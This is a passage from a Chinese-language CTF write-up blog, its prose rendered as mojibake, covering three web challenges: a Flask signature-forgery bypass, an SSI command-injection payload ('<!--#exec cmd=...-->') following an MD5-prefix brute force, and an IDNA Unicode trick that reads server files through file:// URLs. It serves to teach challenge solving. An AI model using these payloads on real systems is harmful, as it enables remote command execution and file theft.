Error&quot;</span><br>      <span class="hljs-keyword">else</span>:<br>          result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>          result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>      <span class="hljs-keyword">return</span> result <br></code></pre></td></tr></table></figure><p>ä»–å…ˆæ£€æŸ¥äº†<code>checkSign</code>æ˜¯å¦ä¸ºçœŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-comment">#checkSign</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<span class="hljs-comment"># å½“æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°actionå’Œparamç»è¿‡getSignè¿™ä¸ªå‡½æ•°ä¹‹åä¸signç›¸ç­‰ï¼Œå°±è¿”å›true</span><br>       <span class="hljs-keyword">if</span> getSign(self.action, self.param) == self.sign:<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>       <span class="hljs-keyword">else</span>:<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>  <span class="hljs-comment"># getSign</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>): <span class="hljs-comment"># ä¸‰ä¸ªå‚æ•°æ‹¼æ¥ç„¶åmd5</span><br>   <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯<code>/geneSign</code>è·¯ç”±ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><span class="hljs-comment">#è·¯ç”±</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#è·å–HTTPè¯·æ±‚ä¸­åä¸º&quot;param&quot;çš„å‚æ•°çš„å€¼,å¦‚æœæ‰¾ä¸åˆ°å°±è¿”å›ç©ºå­—ç¬¦ä¸²</span><br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br></code></pre></td></tr></table></figure><p>å…¶å®æ¢³ç†å®Œä»£ç æ€è·¯å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®æ ‡æ˜¯æŠŠ<code>./flag.txt</code>çš„å†…å®¹è¯»å‡ºæ¥ -&gt;å¯ä»¥é€šè¿‡<code>Exec()</code>å®ç° - &gt;å®ç°<code>Exec()</code>éœ€è¦æ»¡è¶³<code>self.checkSign()</code>å’Œ<code>&quot;scan&quot; in self.action &amp;&quot;read&quot; in self.action</code>åŒæ—¶ä¸ºçœŸã€‚</p><p>é¦–å…ˆæ˜¯<code>checkSign</code>ï¼Œå¦‚æœæ»¡è¶³<code>hashlib.md5(secert_key + param + action).hexdigest()</code> &#x3D;&#x3D;<code>self.sign</code> æ‰ä¼š<code>return ture</code>ã€‚æˆ‘ä»¬çŸ¥é“<code>signã€action</code>æ˜¯é€šè¿‡<code>cookie</code>ä¼ è¿‡æ¥çš„,<code>param</code>æ˜¯åˆ©ç”¨<code>GET</code>æ–¹æ³•ä¼ è¿‡æ¥çš„ã€‚ä½†ä»…å‰©çš„è¿™ä¸ª<code>secret_key</code>æˆ‘ä»¬å¹¶ä¸çŸ¥é“ã€‚</p><p>è¿™æ—¶å¯ä»¥åˆ©ç”¨<code>/geneSign</code>è¿™ä¸ªè·¯ç”±ï¼Œä»–å¯ä»¥è¿”å›<code>hashlib.md5(secert_key + param + scan).hexdigest()</code>(æ³¨æ„ä»–çš„<code>action</code>äº‹å…ˆå®šä¹‰å¥½äº†ï¼Œæ²¡æ³•ä¿®æ”¹)ã€‚</p><p>å¦‚æœæˆ‘ä»¬è®¿é—®<code>/geneSign?param=flag.txt</code>ï¼Œé‚£ä¹ˆè¿”å›çš„å­—ç¬¦ä¸²ä¼šæ˜¯ï¼š<code>md5(secret_key+flag.txt+scan)</code>ï¼š<code>d7d0f6d0bb268048ca879fc3f180c36d</code></p><p>å¦‚æœæˆ‘ä»¬è®¿é—®<code>/geneSign?param=flag.txtread</code>ï¼Œé‚£ä¹ˆè¿”å›çš„å­—ç¬¦ä¸²ä¼šæ˜¯ï¼š</p><p><code>md5(secret_key+flag.txtread+scan)</code>: <code>50ba0e9dcf745a4ec74863a4f15eeabc</code></p><p>é‚£è¿™ä¸œè¥¿ä¸å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„<code>sign</code>å€¼å—ï¼Ÿ</p><p>æŠ“ä¸ªåŒ…ä¿®æ”¹<code>Cookie:action=readscan;sign=50ba0e9dcf745a4ec74863a4f15eeabc</code></p><p><img src="/img/SSRFME2.png" alt="SSRFME2"></p><p>å‚è€ƒæ–‡ç« <code>https://www.cnblogs.com/zzjdbk/p/13685940.html</code></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæ²¡å‘ç°ä»€ä¹ˆæç¤º</p><p><img src="/img/easysearch1.png" alt="easysearch1"></p><p><code>username</code>å’Œ<code>password</code>æ˜¯ä»¥<code>POST</code>å½¢å¼æäº¤çš„ï¼Œæœªç»è¿‡ä»»ä½•åŠ å¯†ï¼š</p><p><img src="/img/easysearch2.png" alt="easysearch2"></p><p>è¯•äº†è¯•æ„Ÿè§‰ä¸æ˜¯SQLæ³¨å…¥ï¼Œé¢˜ç›®<code>EasySearch</code>,ç”¨<code>dirsearch</code>æ‰«ä¸€ä¸‹ï¼Ÿ</p><p>æ²¡æ‰«å‡ºæ¥ï¼Œç”¨å¾¡å‰‘æ‰«è¿˜æ˜¯æ²¡æ‰«å‡ºæ¥ã€‚ã€‚åæ¥ç›´æ¥å»çœ‹äº†<code>wp</code>ã€‚ã€‚ã€‚</p><p><code>/index.php.swp</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-variable">$random</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$content</span>); <br>&#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123; <span class="hljs-comment">//å–å¯†ç åŠ å¯†åçš„å‰å…­ä½ä¸$adminæ¯”è¾ƒï¼Œå‡å¦‚ç›¸ç­‰åˆ™</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.<span class="hljs-title function_ invoke__">get_hash</span>().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">***&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$shtml</span>);<br>            ***<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>            <br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>***<br>    &#125;<br>***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å…ˆæ‰¾<code>md5</code>åŠ å¯†åå‰å…­ä½æ˜¯<code>6d0bc1</code>çš„å­—ç¬¦ä¸²ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">helloworld</span>(<span class="hljs-params">target</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000</span>):<br>       <span class="hljs-keyword">if</span> hashlib.md5(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == target:<span class="hljs-comment">#å“ˆå¸Œæ“ä½œå‰å¿…é¡»å…ˆå¯¹å­—ç¬¦ä¸²ç¼–ç </span><br>        <span class="hljs-built_in">print</span>(i)<br>        <br>target = <span class="hljs-string">&#x27;6d0bc1&#x27;</span><br>helloworld(target)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><br><span class="hljs-number">2020666</span><br><span class="hljs-number">2305004</span><br><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>ç”¨æˆ·åä»»æ„ï¼Œéšä¾¿é€‰ä¸ªç¬¦åˆæ¡ä»¶çš„å¯†ç ï¼Œç™»é™†åç•Œé¢å•¥ä¹Ÿæ²¡æœ‰ï¼Œå»çœ‹çœ‹åŒ…å¤´ï¼š</p><p><img src="/img/easysearch3.png" alt="easysearch3"></p><p><code>Url_is_here:public/08ce2e9aef0f551307554f2c1b21d8271ffbcd87.shtml</code>,è®¿é—®ï¼š</p><p><img src="/img/easysearch5.png" alt="easysearch5"></p><p>å¯ä»¥çœ‹åˆ°ä»–æŠŠç”¨æˆ·åæ˜¾ç¤ºå‡ºæ¥äº†ï¼Œå¸ˆå‚…ä»¬çš„<code>wp</code>ä¸­è¯´è¿™ä¸œè¥¿å«<code>SSIæ³¨å…¥</code>ï¼š</p><p><code>SSI</code>:</p><p><img src="/img/SSI1.png" alt="SSI1"></p><p>å¯ä»¥çœ‹åˆ°è¦åŒ…å«çš„ä¸œè¥¿æ˜¯ç”¨æˆ·å¯æ§çš„ã€‚</p><p><code>shtml</code>ï¼š</p><p><img src="/img/SSI2.png" alt="SSI2"></p><p><code>shtmlæ–‡ä»¶å¯ä»¥åœ¨æœåŠ¡ç«¯æ‰§è¡Œä¸€äº›æŒ‡ä»¤</code></p><p><img src="/img/SSI3.png" alt="SSI3"></p><p><code>Web</code>æœåŠ¡å™¨å¼€å¯äº†<code>SSI</code>åŠŸèƒ½ - &gt;ç”¨æˆ·é€šè¿‡æ„é€ æ¶æ„<code>SSI</code>æŒ‡ä»¤æ‰§è¡ŒæŸäº›æ“ä½œ - &gt; æ‰§è¡Œå‘½ä»¤å¹¶å½¢æˆ<code>shtml</code>æ–‡ä»¶</p><p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>username</code>å’Œ<code>password</code>ï¼Œ<code>username</code>æœ‰å›æ˜¾è€Œä¸”<code>password</code>æ˜¯å›ºå®šçš„ï¼Œé€šè¿‡è°ƒæ•´<code>username</code>çš„å€¼æ¥è¿›è¡Œ<code>SSIæ³¨å…¥</code>ï¼šæŠŠ<code>username</code>æ”¹æˆ<code>&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</code>å†è®¿é—®ï¼š</p><p><img src="/img/easysearch6.png" alt="easysearch6"></p><p>ç„¶åæ”¹æˆ<code>&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</code>å°±è¡Œ</p><p><code>flag&#123;60f16b0b-40d8-4be2-a7f0-96dd2d99e7d6&#125;</code></p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p><img src="/img/nigix1.png" alt="nigix1"></p><p>æºç ä¸­çš„æç¤ºï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="hljs-comment">&lt;!-- Do you know the nginx? --&gt;</span><br></code></pre></td></tr></table></figure><p>æ¢³ç†ä¸€ä¸‹è¿™æ®µä»£ç ï¼š </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlsplit, urlunsplit<br><span class="hljs-keyword">import</span> urllib.request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUrl</span>():<br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)<br>    host = urlparse(url).hostname <span class="hljs-comment"># urlparseæ˜¯Pythonæ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œä½äºurllib.parseæ¨¡å—ä¸­ã€‚å®ƒç”¨äºè§£æURLå­—ç¬¦ä¸²ï¼Œå°†å…¶æ‹†åˆ†ä¸ºå¤šä¸ªéƒ¨åˆ†ï¼ŒåŒ…æ‹¬åè®®ã€ä¸»æœºåã€è·¯å¾„ã€æŸ¥è¯¢å‚æ•°ç­‰ã€‚ä»–ä¼šæŠŠç›®æ ‡urlä¸­çš„ä¸»æœºåè§£æå‡ºæ¥èµ‹å€¼ç»™host</span><br>    <br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span><br>    <br>    parts = <span class="hljs-built_in">list</span>(urlsplit(url))  <span class="hljs-comment">#urlsplit(url)å‡½æ•°ä¼šå°†URLå­—ç¬¦ä¸²è§£æä¸ºå¤šä¸ªéƒ¨åˆ†ï¼ŒåŒ…æ‹¬åè®®ã€ä¸»æœºåã€è·¯å¾„ã€æŸ¥è¯¢å‚æ•°ç­‰ï¼Œå¹¶è¿”å›ä¸€ä¸ªnamedtupleå¯¹è±¡ã€‚ç„¶åé€šè¿‡list()å‡½æ•°å°†namedtupleå¯¹è±¡è½¬æ¢ä¸ºåˆ—è¡¨ï¼Œå­˜å‚¨åœ¨åä¸º&quot;parts&quot;çš„å˜é‡ä¸­</span><br>    host = parts[<span class="hljs-number">1</span>]<br>    <br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 222 &quot;</span> + host<br>    <br>    newhost = []<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) <span class="hljs-comment"># æ³¨æ„è¿™ä¸ª</span><br>    <br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost) <span class="hljs-comment">#å°†åˆ—è¡¨newhostä¸­çš„å…ƒç´ ä½¿ç”¨&#x27;.&#x27;è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²</span><br>    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>] <span class="hljs-comment"># ç»è¿‡urlunsplitå‡½æ•°å¤„ç†åçš„partsé‡æ–°æ‹¼æ¥æˆä¸€ä¸ªURLï¼Œå¹¶ä¸”ä½¿ç”¨ç©ºæ ¼å°†å…¶åˆ†å‰²æˆä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œç„¶åå–åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ èµ‹å€¼ç»™finalUrlå˜é‡</span><br>    host = urlparse(finalUrl).hostname<br>    <br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read() <span class="hljs-comment"># æ‰“å¼€finalUrlå¯¹åº”çš„URLï¼Œç„¶åä½¿ç”¨read()æ–¹æ³•æ¥è¯»å–è¯¥URLçš„å†…å®¹ã€‚æœ€åï¼Œä½¿ç”¨returnè¯­å¥å°†è¯»å–çš„å†…å®¹è¿”å›ã€‚</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 333&quot;</span><br><br></code></pre></td></tr></table></figure><p><code>URL</code>çš„ä¸€èˆ¬æ ¼å¼ï¼š</p><p><code>&lt;åè®®&gt;://&lt;ä¸»æœº&gt;:&lt;ç«¯å£&gt;/&lt;è·¯å¾„&gt;</code></p><p>å¸¸è§çš„åè®®æœ‰<code>http</code>,<code>https</code>,<code>ftp</code>ä»¥åŠ<code>file</code>ã€‚å…¶ä¸­FIleåè®®ä¹Ÿå«<strong>æœ¬åœ°æ–‡ä»¶ä¼ è¾“åè®®</strong> ï¼Œä¸»è¦ç”¨äºè®¿é—®æœ¬åœ°è®¡ç®—æœºä¸­çš„æ–‡ä»¶ã€‚æ ¼å¼ï¼š<strong>file:&#x2F;&#x2F;&#x2F;æ–‡ä»¶è·¯å¾„</strong>ã€‚æ¯”å¦‚ï¼š<code>file:///D:/mywebproject/bigwatermelon/index.html</code></p><p>å¯ä»¥çœ‹åˆ°<code>url</code>ç»è¿‡å¤„ç†åè¿›è¡Œäº†ä¸‰æ¬¡<code>if</code>æ¡ä»¶çš„åˆ¤æ–­ï¼Œå‰ä¸¤æ¬¡åˆ¤æ–­<code> if host == &#39;suctf.cc&#39;</code>ï¼Œå¦‚æœè¿”å›<code>true</code>å°±ç›´æ¥  <code> return    xxxxx</code>,å¦‚æœç¬¬ä¸‰æ¬¡<code>if  host == &#39;suctf.cc&#39;</code> ï¼Œè¿™æ—¶ä¼šè¿”å›æŒ‡å®š<code>url</code>çš„å†…å®¹ã€‚</p><p>è¿™ä¹ˆçœ‹ä¼¼ä¹æ˜¯çŸ›ç›¾çš„ï¼Œä¸è¿‡ç¬¬ä¸‰æ¬¡åˆ¤æ–­å‰è¿›è¡Œäº†<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>å¤„ç†ã€‚è§£é¢˜æ€è·¯å°±æ˜¯å¯»æ‰¾ä¸€ä¸ªç‰¹å®šçš„<code>URL</code>,ä»–ç»è¿‡å‰ä¸¤æ¬¡è§£æå<code>host != scctf.cc</code>ä½†ç»è¿‡ç¼–ç åæ»¡è¶³<code>host == suctf.cc</code></p><p> <code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code> è¿›è¡Œäº†è§„èŒƒåŒ–, ä¼šæŠŠæŸäº›ç‰¹æ®Šçš„ Unicode å­—ç¬¦è§„èŒƒåŒ–ä¸ºæ­£å¸¸çš„ ASCII å­—ç¬¦ã€‚é‚£æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€äº› unicode å­—ç¬¦ç»•è¿‡å‰ä¸¤ä¸ª if çš„æ£€æµ‹, å¹¶ä¸”åœ¨è¿›è¡Œè§„èŒƒåŒ–ä¹‹åé€šè¿‡ç¬¬ä¸‰ä¸ª if çš„åˆ¤æ–­ã€‚</p><p><code>IDNAç¼–ç é€šå¸¸ç”¨äºå°†åŸŸåä¸­çš„éASCIIå­—ç¬¦è½¬æ¢ä¸ºASCIIå…¼å®¹æ ¼å¼</code></p><p>ç„¶åå°±æ˜¯æ‰¾æŸä¸ª<code>unicode</code>è®©ä»–è§„èŒƒåŒ–ä¹‹å‰<code>ä¸æ­£å¸¸</code>ä½†æ˜¯è§„èŒƒåŒ–å<code>æ­£å¸¸</code>ã€‚è¿™é‡Œå‚è€ƒäº†<code>mochu</code>å¸ˆå‚…çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">chars = [<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>]<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> chars:<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x7f</span>, <span class="hljs-number">0x10FFFF</span>):<br><span class="hljs-keyword">try</span>:<br>char_i = <span class="hljs-built_in">chr</span>(i).encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-keyword">if</span> char_i == c:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ASCII: &#123;&#125;   Unicode: &#123;&#125;    Number: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c, <span class="hljs-built_in">chr</span>(i), i))<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><br>        <span class="hljs-comment">#https://blog.csdn.net/mochu7777777/article/details/127140963</span><br>        <span class="hljs-comment">#åœ¨ç»“æœä¸­éšä¾¿é€‰ä¸€ä¸ªæ›¿æ¢å°±å¥½</span><br></code></pre></td></tr></table></figure><p><img src="/img/nignx.png" alt="nignx"></p>   <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#nginxä¸­ä¸€äº›é‡è¦æ–‡ä»¶çš„ä½ç½®</span><br><br>    é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š<span class="hljs-regexp">/etc/</span>nginx<br>    ä¸»é…ç½®æ–‡ä»¶ï¼š<span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/conf/</span>nginx.conf<br>    ç®¡ç†è„šæœ¬ï¼š<span class="hljs-regexp">/usr/</span>lib64<span class="hljs-regexp">/systemd/</span>system/nginx.service<br>    æ¨¡å—ï¼š<span class="hljs-regexp">/usr/</span>lisb64<span class="hljs-regexp">/nginx/m</span>odules<br>    åº”ç”¨ç¨‹åºï¼š<span class="hljs-regexp">/usr/</span>sbin/nginx<br>    ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html<br>    æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class="hljs-regexp">/var/</span>log/nginx<br>    é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf/nginx.conf<br></code></pre></td></tr></table></figure><p>å› ä¸ºçœ‹äº†å…¶å®ƒå¸ˆå‚…çš„<code>wp</code>å°±ç›´æ¥å»è®¿é—®äº†<code>file://Å¿uctf.cc/usr/local/nginx/conf/nginx.conf</code>ï¼ˆæ³¨æ„suctf.ccæ˜¯ä¸»æœºåï¼‰</p><p><img src="/img/nignx2.png" alt="nignx2"></p><p>æœ€åæŠŠ<code>url=file://Å¿uctf.cc/usr/fffffflag</code>æ”¾è¿›å»å°±è¡Œ</p><p>å‚è€ƒæ–‡ç« ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 